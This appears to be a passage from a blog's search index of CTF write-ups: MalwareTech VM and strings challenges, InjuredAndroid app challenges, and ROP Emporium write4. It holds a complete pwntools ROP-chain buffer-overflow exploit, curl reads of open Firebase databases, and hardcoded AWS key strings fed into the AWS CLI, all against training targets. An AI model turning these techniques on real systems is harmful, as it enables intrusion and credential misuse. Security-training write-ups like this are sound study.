value2, value3):    global dat_420    if value1 == 1:        membytes[value2] = value3    elif value1 == 2:        dat_420 = membytes[value2]    else:        if value1 == 3:            membytes[value2] = membytes[value2] ^ dat_420        else:            return False    return Trueif __name__ ==\"__main__\":    global membytes    membytes = []    #open the encypted file and read bytes    with open('ram.bin','rb') as rambin:        membytes= list(rambin.read())    counter  =0    uvar2 = 0    bvar1 = 1    bvar3 = 2    uvar2_response = True    while uvar2_response:        counter +=3        uvar2_response = fun_00402270(membytes[counter+ 0xff + uvar2], membytes[counter+0xff + bvar1], membytes[counter+ 0xff + bvar3])    print([chr(x) for x in membytes[:26]])Running the above script in the terminal gets us our flagvx@archie:vm$ python3 x.py['F', 'L', 'A', 'G', '{', 'V', 'M', 'S', '-', 'A', 'R', 'E', '-', 'F', 'O', 'R', '-', 'M', 'A', 'L', 'W', 'A', 'R', 'E', '}', '\\x00']After a successful decryption of the rambin contents, the sub_4022E0 function return the pointer to the flag to main function as shown in the image below.Therefore main function calculates MD5 hash of the flag and outputs to message dialogbox using MessageBoxA function.The correct flag for the vm challenge is FLAG{VMS-ARE-FOR-MALWARE}"
  },
  
  {
    "title": "Malware strings analysis",
    "url": "/posts/malware-strings/",
    "categories": "malware",
    "tags": "malware, strings, ctf",
    "date": "2021-12-07 21:07:00 +0300",
    





    "snippet": "This post is a writeup of “strings” challenges by MalwareTech. The challenges can be downloaded from the author’s website challenges.The goal of “strings” challenges is to understand implementation of strings in malware through static analysis. Strings are very useful in storing the configurations, decryption keys, data and C2 server addresses.For analysis, I will use IDApro free for analysis. The author of the challenges provides a set of rules to follow while solving.Rules &amp; Information- You are not require to run strings1.exe, this challenge is static analysis only.- Do not use a debugger or dumper to retrieve the decrypted flag from memory, this is cheating.- Analysis can be done using the free version of IDA Pro (you don’t need the debugger).challenge1- Strings1Description  strings1.exe contains an un-encrypted flag stored within the executable. When run, the program will output an MD5 hash of the flag but not the original. Can you extract the flag?Knowing the binary is a windows PE, drag binary into IDA for analysis. Initial analysis of the binary is fast because binary is relatively small. The disassembled code is as one shown in the image.From the analysis of disassembled code, we take flag as input and print out md5 of the flag. The md5_hash function is responsible for calculating the MD5 hash of the flag and MessageBoxA is responsible for displaying the md5hash of the flag in a modal dialog box.The correct flag is FLAG{CAN-I-MAKE-IT-ANYMORE-OBVIOUS}Inputting the above flag in the authors website we get a correct message.  Correct flag for strings1!Challenge2- Strings2  strings2.exe contains an un-encrypted flag stored within the executable. When run, the program will output an MD5 hash of the flag but not the original. Can you extract the flag?Goal of the second challenge is to understand stack strings. Stack strings is where strings are copied in single bytes at a time, this helps malware avoid detection algorithms of common strings.Load second binary into IDA for analysis. The main function of the binary looks like the one shown in the image below.From above disassembled code, the flag string is pushed in single bytes, and then passed to the md5_char function. m5_char function is responsible for calculating the MD5sum of the flag as previous seen in challenge1. Concatenating the bytes we get our second flag.The flag is FLAG{STACK-STRINGS-ARE-BEST-STRINGS}Challenge3 - Strings3  strings3.exe contains an un-encrypted flag stored within the executable. When run, the program will output an MD5 hash of the flag but not the original. Can you extract the flag?Goal of the challenge is understanding how malware uses resources section of the PE. Drag the strings3 binary into IDA and disassemble the main function. The disassembled code looks the one in the image below.Looking at the above function is we have a new function, FindResourceA. Looking at the windows documentation, FindResourceA function is responsible determination of a resource with the specified type and name in the specified module as shown in the code snip below.HRSRC FindResourceA(  [in, optional] HMODULE hModule,  [in]           LPCSTR  lpName,  [in]           LPCSTR  lpType);From the disassembly above, the name of the resource we are referencing is rc.rc. After the execution of FindResourceA function it returns an handle to the specified resource`s information block. In x86 assembly code the return values of functions are put in eax register.From the above code we can reconstruct the c-style code of the FindResource function.FindResourceA(0, \"rc.rc\", 6)The handle module is 0 which is then stored in eax register and then used for calculation of the UID of the resource as shown in assembly below.mov [ebp+var_8], eaxmov eax, 1shl eax, 8xor edx, edxinc edxshl edx, 4or eax, edxFrom the above assembly code, the value of eax is 0. The first line saves eax value to a memory register.Second line increments eax register value by 1. Therefore the new value of eax register is eax=1.Third line, shifts the bits value of eax register to the left by 8 times. we calculate the new value using python.&gt;&gt;&gt; 1 &lt;&lt;8256&gt;&gt;&gt;value of 1 shifted to the left 8 times becomes 256 as shown above.Fourth line, is we are clearing the edx register through xor operation. Therefore the value of edx is 0.Line 5 we increment the value of edx by 1. The new value stored in edx register is 1, edx=1 .Line 6 we shift the value of edx register by 4 positions to the left.&gt;&gt;&gt; 1 &lt;&lt;416&gt;&gt;&gt;From the calculation above, the new value od edx register is 16. edx=16. Therefore for the last line we are doing a bitwise inclusive OR operation of value at eax and edx register.The values for eax and edx registers are 256 and 16 respectively.&gt;&gt;&gt; 256 | 16272&gt;&gt;&gt;The result of the bits operation are therefore stored on the eax register. The new eax value is 272. Finally the value of eax register is the stored in memory address referenced below by UIDmov [ebp+UID], eaxThe analysis of the disassembled code above, shows the binary loads a resource from the executable referenced by uID. The function structure for the LoadStringA functions looks like the one below.int LoadStringA(  [in, optional] HINSTANCE hInstance,  [in]           UINT      uID,  [out]          LPSTR     lpBuffer,  [in]           int       cchBufferMax);The uID integer value of the resource to be loaded is 272. For viewing the executable resources you can use ResourcesEditor tool or python3 pefile library as shown in the code below.import pefilepe = pefile.PE(\"./strings3.exe_\")pe.print_info()The above 2 line of python3 code print all the information about the executable. As shown below is our resources section and references the string uid we are loading.From the image above, FLAG{RESOURCES-ARE-POPULAR-FOR-MALWARE} string is loaded into the buffer through LoadStringA function referenced by uid 272. The pointer to the string is then passed to md5 function which is used for calculating md5 value of the string and then displayed in the modal box.The correct flag is FLAG{RESOURCES-ARE-POPULAR-FOR-MALWARE}.For learning more about resource section of Portable Executable, check PE resources by @struppigel ."
  },
  
  {
    "title": "Android application security part2",
    "url": "/posts/android-appsec-part2/",
    "categories": "appsec",
    "tags": "android, appsec",
    "date": "2021-11-25 21:07:00 +0300",
    





    "snippet": "Second part series of the android application security. This part focuses on the security of sqlite databases, firebase and AWS security.Flag7 - SqliteWhat is sqlite?Sqlite is a structure query base database that enables applications to do local storage in the application directory. The goal of the challenge is to understand how local storage of databases may lead to leakage of information.First step is decompilation of FlagSevenSqliteActivity using Jadx.Analysis of an new activity of android application, it is best to start at the onCreate method defined in the Activity.oncreate is the first method to be called by an application when an activity is started.The decompiled oncreate method code is as shown below.public void onCreate(Bundle bundle) {    super.onCreate(bundle);    setContentView(R.layout.activity_flag_seven_sqlite);    C((Toolbar) findViewById(R.id.toolbar));    j.g.a(this);    H();    ((FloatingActionButton) findViewById(R.id.fab)).setOnClickListener(new a());    SQLiteDatabase writableDatabase = this.u.getWritableDatabase();    ContentValues contentValues = new ContentValues();    contentValues.put(\"title\", Base64.decode(\"VGhlIGZsYWcgaGFzaCE=\", 0));    contentValues.put(\"subtitle\", Base64.decode(\"MmFiOTYzOTBjN2RiZTM0MzlkZTc0ZDBjOWIwYjE3Njc=\", 0));    writableDatabase.insert(\"Thisisatest\", null, contentValues);    contentValues.put(\"title\", Base64.decode(\"VGhlIGZsYWcgaXMgYWxzbyBhIHBhc3N3b3JkIQ==\", 0));    contentValues.put(\"subtitle\", h.c());    writableDatabase.insert(\"Thisisatest\", null, contentValues);}The method passes base64 encoded strings and stores them into string variables.From the “hint” of application name, we are creating a writable database through SQLiteDatabase functions. The activity writes some strings to the database. The database being referenced is called Thisisatest.Next logical step is decoding the Base64 encoded strings to get the corresponding human readable form of data.VGhlIGZsYWcgaGFzaCE    - The flag hash!MmFiOTYzOTBjN2RiZTM0MzlkZTc0ZDBjOWIwYjE3Njc - 2ab96390c7dbe3439de74d0c9b0b1767VGhlIGZsYWcgaXMgYWxzbyBhIHBhc3N3b3JkIQ  - The flag is also a password!The decoded strings as shown above give sus hints on solving the challenge.The author provides us with the hash of the flag.For further analysis we decode even strings defined in the Activity as shown below.private final String w = \"ZjFhZy1wYTU1\";   #f1ag-pa55private byte[] x = Base64.decode(\"c3FsaXRl\", 0);  #sqliteprivate byte[] y = Base64.decode(this.w, 0);private final String z;Analyze FlagSevensqliteActivity in order to understand strings usage in our activity. Important strings are f1ag-pa55 and sqlite guiding us in solving the problem.    public FlagSevenSqliteActivity() {        byte[] bArr = this.x;      //sqlite        d.m.b.d.b(bArr, \"decodedDirectoryOne\");        Charset charset = StandardCharsets.UTF_8;        d.m.b.d.b(charset, \"StandardCharsets.UTF_8\");        this.z = new String(bArr, charset);        byte[] bArr2 = this.y;        //f1ag-pa55        d.m.b.d.b(bArr2, \"decodedDirectoryTwo\");        Charset charset2 = StandardCharsets.UTF_8;        d.m.b.d.b(charset2, \"StandardCharsets.UTF_8\");        this.A = new String(bArr2, charset2);        f b2 = f.b();        d.m.b.d.b(b2, \"FirebaseDatabase.getInstance()\");        d d2 = b2.d();        d.m.b.d.b(d2, \"FirebaseDatabase.getInstance().reference\");        this.B = d2;        d h = d2.h(this.z);        d.m.b.d.b(h, \"database.child(refDirectory)\");        this.C = h;        d h2 = this.B.h(this.A);        d.m.b.d.b(h2, \"database.child(refDirectoryTwo)\");        this.D = h2;    }flagSevensqliteActivity shows how application is parsing data from the Firebase instance. In order to understand the data being fetched, we need to know nodes we are fetching data from. From decompiled code, we are accessing the string x as shown in the constructor method in line 1 through bArr byte array. Our string is then passed to variable z constructor method as referenced this.z constructor.This means f1ag-pa55 and sqlite are our firebase nodes.To get the firebase link, look for link in strings.xml in the resources directory of the application.The link of firebase url is shown in the image below. Manually test firebase endpoints manually to see if they are vulnerable as shown in the code below. Adding .json at the end of the firebase endpoint enables one to read data.First, test endpoint using sqlite node.vx@archie:output$ curl https://injuredandroid.firebaseio.com/sqlite.json\"S3V3N_11\"From the above results, we get our flag. Accessing endpoint using f1ag-pa55 using .json firebase trick, password.vx@archie:output$ curl https://injuredandroid.firebaseio.com/f1ag-pa55.json\"hunter2\"hunter2 is our correct password for the challenge.FLag8 - AWS Storage and Security.Goal: Understanding misconfiguration of AWS storage and security implementation in the android applications.Decompiled flagEightclass activity code looks like the one shown below.public FlagEightLoginActivity() {    f b2 = f.b();    d.m.b.d.b(b2, \"FirebaseDatabase.getInstance()\");    d d2 = b2.d();    d.m.b.d.b(d2, \"FirebaseDatabase.getInstance().reference\");    this.u = d2;    d h = d2.h(\"/aws\");    d.m.b.d.b(h, \"database.child(\\\"/aws\\\")\");    this.v = h;}The activity initializes firebase instance and fetches some information from the AWS child node in the firebase storage model. First check if the model is vulnerable to .json trick of firebase read write vulnerability.vx@archie:ret2csu$ curl https://injuredandroid.firebaseio.com/aws.json\"C10ud_S3cur1ty_lol\"Next is analyzing onClick method of the activity. This method responds to events of an application clicked and are defined in the Activity.public final void onClick(View view) {    if (FlagEightLoginActivity.this.H() == 0) {        if (view != null) {            Snackbar X = Snackbar.X(view, \"AWS CLI.\", 0);            X.Y(\"Action\", null);            X.N();            FlagEightLoginActivity flagEightLoginActivity = FlagEightLoginActivity.this;            flagEightLoginActivity.I(flagEightLoginActivity.H() + 1);            return;        }        d.m.b.d.k();        throw null;    } else if (FlagEightLoginActivity.this.H() != 1) {    } else {        if (view != null) {            Snackbar X2 = Snackbar.X(view, \"AWS profiles and credentials.\", 0);            X2.Y(\"Action\", null);            X2.N();            FlagEightLoginActivity.this.I(0);            return;        }        d.m.b.d.k();        throw null;    }}From HINTS provided in the Activity, we need to understand the “AWS profiles and credentials” usage in order to subvert the intended behavior.what are the AWS profile stored?Most of the strings are stored in strings.xml in the resources directory which are referenced throughout the application. In strings.xml file we have two interesting strings.&lt;string name=\"AWS_ID\"&gt;AKIAZ36DGKTUIOLDOBN6&lt;/string&gt;&lt;string name=\"AWS_SECRET\"&gt;KKT4xQAQ5cKzJOsoSImlNFFTRxjYkoc71vuRP48S&lt;/string&gt;AWS CLI is a unified tool to manage your AWS services, it enables one to configure AWS services through command line and automate them through scripts.To install aws-cli on your linux machine type the following in your terminal.python -m pip install --user awscliFor adding the aws profile, use the following command in terminal as shown below.vx@archie:~$ aws configureAWS Access Key ID [None]: AKIAZ36DGKTUIOLDOBN6AWS Secret Access Key [None]: KKT4xQAQ5cKzJOsoSImlNFFTRxjYkoc71vuRP48SFlag9- FireBaseWhat is firebase?Google firebase is a mobile and web application development platform that provides a real-time database that continuously syncs data between cloud and user’s mobile devices. Firebase databases are accessible via an API and that if developers have not correctly secured their firebase database, a simple request can retrieve it`s entire content.We need to analyze the FlagNineFirebaseActivity in order to understand how read and write rules are implemented in the application. public final void goToFlagNineFirebaseActivity(View view) {        startActivity(new Intent(this, FlagNineFirebaseActivity.class));    }public FlagNineFirebaseActivity() {    byte[] decode = Base64.decode(\"ZmxhZ3Mv\", 0);     //  flags/    this.v = decode;    d.m.b.d.b(decode, \"decodedDirectory\");    Charset charset = StandardCharsets.UTF_8;    d.m.b.d.b(charset, \"StandardCharsets.UTF_8\");    this.w = new String(decode, charset);    f b2 = f.b();    d.m.b.d.b(b2, \"FirebaseDatabase.getInstance()\");    d d2 = b2.d();    d.m.b.d.b(d2, \"FirebaseDatabase.getInstance().reference\");    this.x = d2;    d h = d2.h(this.w);    d.m.b.d.b(h, \"database.child(refDirectory)\");    this.y = h;}Decode BASE64 encoded strings in order to understand strings stored in the decode variable.vx@archie:~$ echo \"ZmxhZ3Mv\" | base64 -d            flags/From the above decoded string,we are getting data from firebase storage, in the flags node.Looking at the decompiled below, it gives us an hint of solving the problem “Use the .json trick database url” .public final void onClick(View view) {        String str;        if (FlagNineFirebaseActivity.this.H() == 0) {            if (view != null) {                str = \"Use the .json trick with database url\";            } else {                d.m.b.d.k();                throw null;            }        } else if (FlagNineFirebaseActivity.this.H() == 1) {            if (view != null) {                str = \"Filenames.\";            } else {                d.m.b.d.k();                throw null;            }Firebase Realtime RulesRealtime database stores data as one large JSON tree and synchronized every time a new device is connected.The data received or stored in the database is determined by the security rules of read and write.Firebase allows read and write rules to the database to be set to true or false. When .read is set to true means describes if and data is allowed to be read by users and .write describes if and when data is allowed to be written.Example of a firebase rule where read and write are allowed.{  \"rules\": {    \".read\": true,    \".write\": true  }}When read and write rules are enabled means that everyone with access to the application can read and write unauthorized data to the database.The firebase database url is defined in strings.xml file in the resource section.    &lt;string name=\"firebase_database_url\"&gt;https://injuredandroid.firebaseio.com&lt;/string&gt;The firebase node defined in our instance is flags node, to check if the endpoint node is vulnerable we append a .json at the end of the url node as shown in the image below.vx@archie:injured$ curl https://injuredandroid.firebaseio.com/flags/.json\"[nine!_flag]\"If the url returns data, means our endpoint is vulnerable. From the above output we were able to successfully solve the challenge.Securing FirebaseOne can secure Firebase database by only allowing users of application to have only read permissions to a certain tree node instead of allowing read to the root node in the application. This means the applications can not read data from the neighboring nodes.{  \"rules\": {    \"flag\": {      \".read\": true,      \".write\": false    }  }}"
  },
  
  {
    "title": "Ropemporium Write4 challenge",
    "url": "/posts/ropemporium-write4/",
    "categories": "ropemporium",
    "tags": "ctf, ropemporium",
    "date": "2021-11-20 21:07:00 +0300",
    





    "snippet": "Goal of the challenge is understanding how to abuse readable and writable memory regions in binary files.The target binary can be downloaded from the authors website ropemporium.  Our first foray into proper gadget use.A useful function is still present, but we’ll need to write a string into memory somehow.First we check the binary protections enabled on the binary. Only NX (Not executable) protection is enabled on the binary according to checksec binary utility as shown in the image below.    Arch:     amd64-64-little    RELRO:    Partial RELRO    Stack:    No canary found    NX:       NX enabled    PIE:      No PIE (0x400000)For analysis of binary, we will use gdb debugger to analyze the functions. For analysis of our binary we start at the main function which is the entrypoint of our execution.(gdb) disas mainDump of assembler code for function main:   0x0000000000400607 &lt;+0&gt;:\tpush   rbp   0x0000000000400608 &lt;+1&gt;:\tmov    rbp,rsp   0x000000000040060b &lt;+4&gt;:\tcall   0x400500 &lt;pwnme@plt&gt;   0x0000000000400610 &lt;+9&gt;:\tmov    eax,0x0   0x0000000000400615 &lt;+14&gt;:\tpop    rbp   0x0000000000400616 &lt;+15&gt;:\tretEnd of assembler dump.(gdb)From the above, the main function only calls pwnme function which looks interesting to us. Disassemble the pwnme function as shown below. pwnme@plt is used for referencing pwnme real address. Next step is analyzing libwrite4.so library using gdb.vx@archie:write4$ gdb -q libwrite4.soReading symbols from libwrite4.so...(No debugging symbols found in libwrite4.so)(gdb) disas pwnmeDump of assembler code for function pwnme:   0x00000000000008aa &lt;+0&gt;:\tpush   rbp   0x00000000000008ab &lt;+1&gt;:\tmov    rbp,rsp   0x00000000000008ae &lt;+4&gt;:\tsub    rsp,0x20   0x00000000000008b2 &lt;+8&gt;:\tmov    rax,QWORD PTR [rip+0x200727]        # 0x200fe0   0x00000000000008b9 &lt;+15&gt;:\tmov    rax,QWORD PTR [rax]   0x00000000000008bc &lt;+18&gt;:\tmov    ecx,0x0   0x00000000000008c1 &lt;+23&gt;:\tmov    edx,0x2   0x00000000000008c6 &lt;+28&gt;:\tmov    esi,0x0   0x00000000000008cb &lt;+33&gt;:\tmov    rdi,rax   0x00000000000008ce &lt;+36&gt;:\tcall   0x790 &lt;setvbuf@plt&gt;   0x00000000000008d3 &lt;+41&gt;:\tlea    rdi,[rip+0x106]        # 0x9e0   0x00000000000008da &lt;+48&gt;:\tcall   0x730 &lt;puts@plt&gt;   0x00000000000008df &lt;+53&gt;:\tlea    rdi,[rip+0x111]        # 0x9f7   0x00000000000008e6 &lt;+60&gt;:\tcall   0x730 &lt;puts@plt&gt;   0x00000000000008eb &lt;+65&gt;:\tlea    rax,[rbp-0x20]   0x00000000000008ef &lt;+69&gt;:\tmov    edx,0x20   0x00000000000008f4 &lt;+74&gt;:\tmov    esi,0x0   0x00000000000008f9 &lt;+79&gt;:\tmov    rdi,rax   0x00000000000008fc &lt;+82&gt;:\tcall   0x760 &lt;memset@plt&gt;   0x0000000000000901 &lt;+87&gt;:\tlea    rdi,[rip+0xf8]        # 0xa00   0x0000000000000908 &lt;+94&gt;:\tcall   0x730 &lt;puts@plt&gt;   0x000000000000090d &lt;+99&gt;:\tlea    rdi,[rip+0x115]        # 0xa29   0x0000000000000914 &lt;+106&gt;:\tmov    eax,0x0   0x0000000000000919 &lt;+111&gt;:\tcall   0x750 &lt;printf@plt&gt;   0x000000000000091e &lt;+116&gt;:\tlea    rax,[rbp-0x20]   0x0000000000000922 &lt;+120&gt;:\tmov    edx,0x200   0x0000000000000927 &lt;+125&gt;:\tmov    rsi,rax   0x000000000000092a &lt;+128&gt;:\tmov    edi,0x0   0x000000000000092f &lt;+133&gt;:\tcall   0x770 &lt;read@plt&gt;   0x0000000000000934 &lt;+138&gt;:\tlea    rdi,[rip+0xf1]        # 0xa2c   0x000000000000093b &lt;+145&gt;:\tcall   0x730 &lt;puts@plt&gt;   0x0000000000000940 &lt;+150&gt;:\tnop   0x0000000000000941 &lt;+151&gt;:\tleave   0x0000000000000942 &lt;+152&gt;:\tretEnd of assembler dump.(gdb)From the assembly code above, we are filling a buffer of size 0x20(32bytes) with a constant byte of zero. memset libc function is used to overwrite any values that have the memory area specified. The memory we are overwriting is [rbp-0x20]. This means we are allocating a memory buffer of size 32 bytes from the address of base pointer in the stack.Therefore the next interesting libc function is read function, which reads user input and stores results in the specified buffer.From the above disassembled code, we are reading 0x200 bytes from the user and storing it in our buffer. This means we are reading more than what the buffer can hold, therefore leading to a stack buffer overflow.ssize_t read(int fd, void *buf, size_t count);  // read(0,[rbp-0x20], 0x200)From the vulnerability,we can exploit it in order to abuse the control flow of the program by controlling the value of the return address.From the authors hint, we need to look for an ELF section that is writable in order to write our target string.  Perhaps the most important thing to consider in this challenge is where we’re going to write our “flag.txt” string. Use rabin2 or readelf to check out the different sections of this binary and their permissions. Learn a little about ELF sections and their purpose.Opening the binary in radare2, we can check permissions of different sections using the command iS as shown in the image below.From the above we are able to determine the data and bss section are both readable and writable. Our target for the gadgets is to write our string to the bss section. Therefore we need to get memory address of .bss area.From the authors challenge hint, we need to disassemble usefulFunction to understand how it works.  Important!: A PLT entry for a function named print_file() exists within the challenge binary, simply call it with the name of a file you wish to read (like “flag.txt”) as the 1st argument.usefulFunction function is responsible for calling print_file function as hinted by the author.From the analysis of the above function, we can determine we are passing a string file name called “nonexistent” to the print_file function. The content of the arguments passed to the print_file function will be printed out to the user. Our goal is to pass our string of interest flag.txt to the the print_file function.From the disassembly of the binary we have another interesting function called usefulGadgets.(gdb) disas usefulGadgetsDump of assembler code for function usefulGadgets:   0x0000000000400628 &lt;+0&gt;:\tmov    QWORD PTR [r14],r15   0x000000000040062b &lt;+3&gt;:\tret   0x000000000040062c &lt;+4&gt;:\tnop    DWORD PTR [rax+0x0]End of assembler dump.(gdb)The gadget from the above assembly code will enable us to write content of r15 register to memory address [r14]. Next step is to look for gadgets that will enable us to control both r14 and r15 register values.For building our chain, we need to understand the calling conventions of AMD64 ABI.The calling convention passes the arguments to the registers in the following order. RDI, RSI, RDX, RCX, R8 and R9.In x86 assembly pop instruction is used for putting value to the memory address, therefore we look for a pop gadget that will enable to control both r14 and r15.  0x0040068f                 5d  pop rbp  0x00400690               415e  pop r14  0x00400692               415f  pop r15  0x00400694                 c3  retExample of the above gadget, we have a pop rbp, pop r14, pop 15 ret instruction gadget. This gadget will enable us to control the desired registers. Because we don’t need the rbp register, for our ropchain, we take the address pointed by pop14 0x00400690. This is possible because rop gadgets are set of instructions that end with ret.From the disassembly of usefulgadgets function we know register r14 points to a memory region we want to write to. Therefore our strategy is to set the value of r14 register to be the address pointer of .bss section of ELF and r15 register to be the value we want to write to .bss section.  Hopefully you’ve realized that ROP is just a form of arbitrary code execution and if we get creative we can leverage it to do things like write to or read from memory. The question we need to answer is: what mechanism are we going to use to solve this problem? Is there any built-in functionality to do the writing or do we need to use gadgets? In this challenge we won’t be using built-in functionality since that’s too similar to the previous challenges, instead we’ll be looking for gadgets that let us write a value to memory such as mov [reg], reg.  0x00400628             4d893e  mov qword [r14], r15  0x0040062b                 c3  retTherefore, two gadgets will enable us to set the register values of r14 and r15 and copy the values of r15 to the memory region defined by r14.Last is a find a gadget that will aid passing of an argument to the print_file function. Because the function takes one argument, we look for a pop rdi ret instruction  0x00400693                 5f  pop rdi  0x00400694                 c3  retNow we have three separate rop gadgets, which we can chain them together to get a fully working rop chain. This chain will enable us to read the file content of the flag.txt and display output to the console.A fully working ropchain exploit code of the challenge is,import pwnpwn.context.arch = \"amd64\"pwn.context.encoding =\"latin-1\"pwn.warnings.simplefilter(\"ignore\")io = pwn.process('./write4')bss_area = pwn.p64(0x00601038)pop_r14_r15 = pwn.p64(0x00400690)pop_rdi = pwn.p64(0x00400693)mov_r14_r15 = pwn.p64(0x00400628)print_file_addr = pwn.p64(0x0000000000400510)payload = b\"A\" * 32 #fill the bufferpayload += b\"B\" *8  #overwrite the base pointerpayload += pop_r14_r15payload += bss_areapayload += b\"flag.txt\"payload += mov_r14_r15payload += pop_rdipayload += bss_areapayload += print_file_addrio.writeafter('&gt;', payload)pwn.info(io.recvall().decode())Successful execution of our exploit, will display a success flag.vx@archie:write4$ python3 x.py[+] Starting local process './write4': pid 7275[+] Receiving all data: Done (45B)[*] Process './write4' stopped with exit code -11 (SIGSEGV) (pid 7275)[*]  Thank you!    ROPE{a_placeholder_32byte_flag!}"
  },
  
  {
    "title": "Android application security part1",
    "url": "/posts/android-appsec-part1/",
    "categories": "appsec",
    "tags": "android, appsec",
    "date": "2021-11-20 21:07:00 +0300",
    





    "snippet": "This is a four part beginner series of Android application security using Vulnerable android application. The application used in the first three part series is a InjuredAndroid by @B3nac.The application covers different security concepts such as hardcoded secrets, weak cryptographic algorithms implementations, misconfiguration, webview vulnerabilities etc. The application can be downloaded from either provided links playstore or github.For solving the challenges you need to have an android phone or an emulator.Environment setupFor application installation to the emulator, use Android debug bridge(adb). adb is a set of command line tools which are installed as part of android studio that enables communication between emulator/real android phone with the connected computer.For Installation, run the command below in a terminal.adb install InjuredAndroid-1.0.12-release.apkAfter a successful installation of the application, the main Activity/page looks like the image below.For static analysis of the application, List of the following tools is used throughout the series.  JADX  Text Editor (visual studio)  Android StudioJADX is a bundle of command line and GUI tools that enables one to produce java source code from android Dex and APK files. It aids in decompiling the android application to java code which is more human readable /friendly.  NB: For reverse engineering/ code auditing of every application, you need to have a clear set of goal or objective of what you want to achieve. This helps narrow down the analysis and avoid many rabbit holes.FLAG ONE - LOGINGoal : Input the right flag.Objective of the first level is to get the correct flag. flag is a piece of reward if you do correct task you are asked to do. Looking at decompiled code in the editor as shown below, there is an interesting function called submitFlag. submit flag function is responsible for validation of user input.public final void submitFlag(View view) {        EditText editText = (EditText) findViewById(R.id.editText2);        C2724g.m882d(editText, \"editText2\");        if (C2724g.m885a(editText.getText().toString(), \"F1ag_0n3\")) {            Intent intent = new Intent(this, FlagOneSuccess.class);            new FlagsOverview().m4085J(true);            new ApplicationC1492j().m4065b(this, \"flagOneButtonColor\", true);            startActivity(intent);        }    }From code above, the FlagoneActivity class implements functionality where the user input is compared with hardcoded flag.The user flag string is compared with hardcoded flag which is “F1ag_0n3”. The method m10785a compares the two objects (user input flag and hardcoded flag) and return a boolean depending on the result of the comparison of two objects. Result can either be true or false.public static boolean m10785a(Object obj, Object obj2) {        return obj == null ? obj2 == null : obj.equals(obj2);    }If the condition is True, new Intent is started which is FlagOneSuccess. Entering hardcoded flag as our input, we get a success message and color of Flag1 in flagsOverview Activity changes to green, meaning challenge has been successfully been solved.Level1 flag is “F1ag_0n3”.For other levels if solved successfully, the color of the flag corresponding level will change to green.FLAG TWO - EXPORTED ACTIVITYGoal : There is a way to bypass the main activity and invoke other activities that are exported.What is an activity?An activity is a single focused thing that the user can do. It is an application component that provide a user interface for users to interact with.Looking at the flagtwoactivity, the source code below.public class FlagTwoActivity extends ActivityC0453c {    /* renamed from: w */    int f4461w = 0;    /* renamed from: F */    public /* synthetic */ void m4090F(View view) {        int i = this.f4461w;        if (i == 0) {            Snackbar X = Snackbar.m2647X(view, \"Key words Activity and exported.\", 0);            X.m2646Y(\"Action\", null);            X.mo2650N();            this.f4461w++;        } else if (i == 1) {            Snackbar X2 = Snackbar.m2647X(view, \"Exported Activities can be accessed with adb or Drozer.\", 0);            X2.m2646Y(\"Action\", null);            X2.mo2650N();            this.f4461w = 0;        }    }    /* access modifiers changed from: protected */    @Override // androidx.appcompat.app.ActivityC0453c, androidx.fragment.app.ActivityC0797d, androidx.activity.ComponentActivity, androidx.core.app.ActivityC0714e, android.app.Activity    public void onCreate(Bundle bundle) {        super.onCreate(bundle);        setContentView(R.layout.activity_flag_two);        m8078C((Toolbar) findViewById(R.id.toolbar));        ((FloatingActionButton) findViewById(R.id.fab)).setOnClickListener(new View.OnClickListener() { // from class: b3nac.injuredandroid.d            @Override // android.view.View.OnClickListener            public final void onClick(View view) {                FlagTwoActivity.this.m4090F(view);            }        });    }}The oncreate method is used for initializing the activity. The goal of the challenge is to invoke the flagtwoactivity from an external application. This activity is an exported activity, meaning it can be started outside the context of the application.Activities in android are defined in AndroidManifest.xml .&lt;activity android:name=\"b3nac.injuredandroid.b25lActivity\" android:exported=\"true\"/&gt;As you see above, activity b3nac.injuredandroid.b25lActivity can be invoked by an external application because android:exported attribute is set to true.For exploitation of the above issue we will use adb. First, we use adb to list installed packages and grep the application of our interest using grep utility.vx@archie:~$ adb shell pm list packages | grep injuredandroidpackage:b3nac.injuredandroidWhat happens when invoke b25lActivity class activity?When b25lActivity activity is invoked by an external application, it sets flag2 color to green in the FlagsOverview activity as illustrated in the code below./* loaded from: classes.dex */public final class b25lActivity extends ActivityC0453c {    /* access modifiers changed from: protected */    @Override // androidx.appcompat.app.ActivityC0453c, androidx.fragment.app.ActivityC0797d, androidx.activity.ComponentActivity, androidx.core.app.ActivityC0714e, android.app.Activity    public void onCreate(Bundle bundle) {        super.onCreate(bundle);        setContentView(R.layout.activity_b25l);        ApplicationC1492j.f4506j.m4062a(this);        new FlagsOverview().m4082M(true);        new ApplicationC1492j().m4065b(this, \"flagTwoButtonColor\", true);    }}Invoke the activity b25lActivity using adb. Alternative method of invoking exported activities is by creating an android application thats starts the target`s activity.vx@archie:~$ adb shell am start  -n b3nac.injuredandroid/.b25lActivityStarting: Intent { cmp=b3nac.injuredandroid/.b25lActivity }When activity two is started successfully through an external application, we are rewarded with a flag.FLAG THREE - RESOURCESGoal: Understanding how an application references Resources.what are resources?Resources are used for defining colors, images, layouts, menus and string values. Everything defined in resources are referenced in application`s code.The decompiled code for FlagThreeActivity is shown below.    public final void submitFlag(View view) {        EditText editText = (EditText) findViewById(R.id.editText2);        C2724g.m882d(editText, \"editText2\");        if (C2724g.m885a(editText.getText().toString(), getString(R.string.cmVzb3VyY2VzX3lv))) {            Intent intent = new Intent(this, FlagOneSuccess.class);            new FlagsOverview().m4083L(true);            new ApplicationC1492j().m4065b(this, \"flagThreeButtonColor\", true);            startActivity(intent);        }    }Looking at submitFlag function defined in FlagThreeActivity.java, the function is comparing user input with value referenced at Resource cmVzb3VyY2VzX3lv . R stands for resource.Looking at strings we get flag as referenced by the string above.&lt;string name=\"cmVzb3VyY2VzX3lv\"&gt;F1ag_thr33&lt;/string&gt;The flag is F1ag_thr33FLAG FOUR - LOGIN2Goal: Get the right flagFor flag four we analyze FlagFourActivity.java. activity. First is to figure out the logic implemented in the submitflag class.    public final void submitFlag(View view) {        EditText editText = (EditText) findViewById(R.id.editText2);        C2724g.m882d(editText, \"editText2\");        String obj = editText.getText().toString();        byte[] a = new C1489g().m4070a();        C2724g.m882d(a, \"decoder.getData()\");        if (C2724g.m885a(obj, new String(a, C2759c.f6854a))) {            Intent intent = new Intent(this, FlagOneSuccess.class);            new FlagsOverview().m4086I(true);            new ApplicationC1492j().m4065b(this, \"flagFourButtonColor\", true);            startActivity(intent);        }    }The above decompiled code,we get user input and compare with bytes in variable a. To understand the logic we analyze the method c1489g and member class m4070a.public class C1489g {    /* renamed from: a */    private byte[] f4499a = Base64.decode(\"NF9vdmVyZG9uZV9vbWVsZXRz\", 0);    /* 